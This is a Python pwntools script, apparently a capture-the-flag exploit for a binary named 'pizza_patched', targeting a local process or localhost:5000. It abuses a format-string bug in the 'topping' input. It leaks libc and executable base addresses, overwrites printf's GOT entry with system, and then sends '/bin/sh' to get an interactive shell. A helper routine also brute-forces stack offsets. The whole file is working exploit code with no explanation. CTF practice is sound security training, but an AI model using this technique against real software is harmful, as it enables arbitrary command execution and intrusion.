#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./pizza_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def dump():
    dump = ""

    for i in range(1, 200):
        io = connect()

        def send(payload: bytes):
            io.sendlineafter(b"> ", b"1")
            io.sendlineafter(b"> ", b"1")

            io.sendlineafter(b"> ", b"12")
            io.sendlineafter(b"topping: ", payload)
            return

        # fsb1 libc, exe leak
        payload = f"#%5$lx#%49$lx#".encode()
        send(payload)

        ## libc leak
        io.recvuntil(b"#")
        leak = io.recvuntil(b"#", drop=True).decode()
        libc.base = int(leak, 16) - 0x1D2A80

        ## exe leak
        leak = io.recvuntil(b"#", drop=True).decode()
        exe.base = int(leak, 16) - unwrap(exe.symbol("main"))

        io.sendlineafter(b": ", b"y")

        # fsb2 overwrite printf got to system
        print(f"got_printf: {hex(unwrap(exe.got('printf')))}")
        print(f"libc_system: {hex(unwrap(libc.symbol('system')))}")
        payload = b""
        payload += b"A" * 8
        payload += f"#%{i}$lx#".encode()
        # payload = pwn.fmtstr_payload(
        # 31, {exe.got("printf"): libc.symbol("system")}, strategy="fast", write_size="bytes"
        # )
        send(payload)
        io.recvuntil(b"#")
        leak = io.recvuntil(b"#", drop=True).decode()
        dump += f"{i}: 0x{leak}\n"

        io.close()

    with open("./dump.txt", "w") as file:
        file.write(dump)

    exit()


def main():
    io = connect()

    def send(payload: bytes):
        assert len(payload) <= 100
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", b"1")

        io.sendlineafter(b"> ", b"12")
        if len(payload) == 100:
            io.sendafter(b"topping: ", payload)
        else:
            io.sendlineafter(b"topping: ", payload)
        return

    # fsb1 libc, exe leak
    payload = f"#%5$lx#%49$lx#".encode()
    send(payload)

    ## libc leak
    io.recvuntil(b"#")
    leak = io.recvuntil(b"#", drop=True).decode()
    libc.base = int(leak, 16) - 0x1D2A80

    ## exe leak
    leak = io.recvuntil(b"#", drop=True).decode()
    exe.base = int(leak, 16) - unwrap(exe.symbol("main"))

    io.sendlineafter(b": ", b"y")
    # fsb2 overwrite printf got to system
    payload = pwn.fmtstr_payload(
        31,
        # {exe.got("printf"): unwrap(libc.symbol("system")) & 0xFFFFFFFF},
        {exe.got("printf"): unwrap(libc.symbol("system"))},
        strategy="small",
        write_size="short",
    )
    send(payload)

    io.sendline(b"y")
    io.sendline(b"1")
    io.sendline(b"1")
    io.sendline(b"12")
    io.sendline(b"/bin/sh\0")

    io.interactive()
    return


if __name__ == "__main__":
    # dump()
    main()
